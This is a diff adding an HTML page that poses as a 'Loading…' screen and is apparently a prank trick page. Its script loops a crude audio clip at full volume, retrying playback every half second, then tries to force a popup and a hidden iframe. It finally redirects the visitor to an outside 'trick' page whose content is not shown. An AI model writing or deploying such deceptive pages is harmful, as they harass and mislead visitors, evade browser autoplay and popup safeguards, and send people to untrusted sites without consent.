@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Loading…</title>
+
+<script>
+window.onload = function () {
+
+    // ---- AUDIO LOOP (retry spam) ----
+    const audio = new Audio("https://www.myinstants.com/media/sounds/epstein-fuh-neckhurts.mp3");
+    audio.loop = true;
+    audio.volume = 1;
+
+    function tryPlay() {
+        audio.play().catch(() => {});
+    }
+
+    // try immediately + keep retrying
+    tryPlay();
+    setInterval(tryPlay, 500);
+
+    // ---- DELAY THEN POPUP + REDIRECT ----
+    setTimeout(function () {
+
+        // attempt popup multiple ways
+        window.open(
+            "https://c.tenor.com/zRBe0HZ_nCcAAAAC/tenor.gif",
+            "_blank"
+        );
+
+        // iframe fallback popup
+        const iframe = document.createElement("iframe");
+        iframe.style.display = "none";
+        iframe.src = "https://c.tenor.com/zRBe0HZ_nCcAAAAC/tenor.gif";
+        document.body.appendChild(iframe);
+
+        // redirect main page
+        window.location.replace("https://juegosboti.xyz/trick/site2.html");
+
+    }, 1000);
+};
+</script>
+</head>
+
+<body>
+    <p>Loading…</p>
+</body>
+</html>
